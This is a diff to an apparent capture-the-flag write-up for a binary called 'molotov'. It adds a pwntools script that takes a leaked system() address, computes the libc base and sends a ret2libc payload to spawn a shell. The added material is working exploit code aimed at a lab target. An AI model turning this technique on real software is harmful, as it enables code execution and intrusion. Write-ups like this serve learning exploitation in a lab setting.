@@ -15,5 +15,17 @@ While decompiling using IDA, we can see that the program is leaking system addre
 - system("/bin/bash")
 ```python
 from pwn import *
-s
+libc = ELF('libc6_2.30-0ubuntu2_amd64.so')
+p = process("./molotov")
+system = int("0x"+p.recvline().rstrip("\n"),16)
+base = system - libc.symbols['system']
+binsh = base + libc.search("/bin/sh").next()
+log.warn("base = "+hex(base))
+payload = ""
+payload += "A"*32
+payload += p32(system)
+payload += "JUNK"
+payload += p32(binsh)
+p.sendline(payload)
+p.interactive()
 ```
